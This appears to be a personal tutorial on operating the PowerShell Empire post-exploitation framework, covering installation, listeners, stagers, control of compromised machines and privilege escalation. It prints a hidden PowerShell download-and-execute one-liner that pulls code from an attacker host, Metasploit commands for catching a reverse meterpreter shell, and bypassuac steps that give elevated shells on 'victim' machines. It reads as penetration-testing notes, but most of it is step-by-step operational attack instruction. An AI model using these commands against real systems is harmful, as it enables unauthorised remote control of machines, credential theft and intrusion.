#Empire
[Empire](https://github.com/adaptivethreat/Empire) is a "pure PowerShell post-exploitation agent built on cryptologically-secure communications and a flexible architecture."

Some links that helped me create my write-up below:

* [https://attackerkb.com/Powershell/Powershell_Empire](https://attackerkb.com/Powershell/Powershell_Empire)
* [https://enigma0x3.net/2016/03/15/phishing-with-empire/](https://enigma0x3.net/2016/03/15/phishing-with-empire/)
* [CheatSheets for various modules](https://github.com/HarmJ0y/CheatSheets)

##Install

The [getting started guide](http://www.powershellempire.com/?page_id=110) walks you through a basic install - here's the quick steps:

    git clone https://github.com/adaptivethreat/Empire.git /opt/empire
    cd /opt/empire/setup
    ./install.sh
    /opt/empire/empire.sh

I found afterwards that my fresh Ubuntu droplet from Digital Ocean coughed up this error when I ran `./empire`:

>Traceback (most recent call last):

>File "./empire", line 6, in <module>

>from OpenSSL import SSL

>ImportError: No module named OpenSSL

Once I did a `sudo apt-get install python-openssl` then everything ran like a champ.

##Launch a listener
1. Type `listeners` and hit **Enter**
2. Setup an HTTP listener (for example) with `set Host http://your.local.ip.address` (tab completion works!).  *Note:* when running this on an AWS instance I found I needed to use FQDN instead of the IP address - i.e. use ec2-1-2-3-4.us-west-2.compute.amazonaws.com instead of 1.2.3.4.
3. Type `info` and hit Enter to confirm the listener is good to go.
4. Type `run` to run it (if you need to kill it, use `list` to see the list of listeners, then do `kill 1` or whatever the number is.

P.S. - [BHIS](http://bhis.co) has a nice tutorial for [scripting the startup of Empire listeners](http://www.blackhillsinfosec.com/?p=5428).

##Configure a stager
1. Type `usestager` and then hit **Tab** to see your options. I like the simple `usestager launcher` for a simple PowerShell one-liner
2. Assign the stager to a configured listener by typing `use Listener NAME-OF_LISTENER`
3. Type `generate` to actually generate it.

##Manage connected machines
Once you get a "bite" type `agents` to see connected machines.  Then do `interact NAME-OF-MACHINE` to begin interacting with it.

##Establish credential sets
I followed [this page](http://www.powershellempire.com/?page_id=114) to figure out how to add/edit credential sets into Empire so they're easily "pluggable" into Empire modules without having to type them every time.

##Create a secondary meterpreter listener
Follow [this article](http://www.powershellempire.com/?page_id=137) for more info, but basically in the `listeners` do a `set Host http://whatever.the.host.is` and `set Type meter`.  Then type `execute` and `list` to see your new listener.

Now on your Kali/Metasploit box, run the following commands to "catch" your incoming shell:

	use exploit/multi/script/web_delivery
	unset all
	set srvhost 0.0.0.0
	set srvport 80
	set lhost MY.PUBLIC.IP.ADDRESS
	set lport 443
	set target 2
	set payload windows/x64/meterpreter/reverse_https
	exploit -j

This will give you a PowerShell one-liner with something like:

`powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $c.downloadstring('http://your-public-ip-address/V23fasdfg4rP5XBryb');
`
Launch the one-liner and you should be in happy shell land!

##Elevating privs
Once you've figured out a way to make your limited account a local admin, here's how you can make your victim machine connect to you *again* but this time with more privs!

1. While interacting with your agent, issue the command `bypassuac NAME-OF-LISTENER`.  So for example, my listener with my initial shell was called `test` so I issued `bypassuac test`
2. You should see a "new" agent connect to your listener, but this one has a *`*`* by it, indicating it is running w/elevated privs!!!

##Other resources:
* [Intercepting passwords with Empire and winning!](https://sensepost.com/blog/2016/intercepting-passwords-with-empire-and-winning/)
* 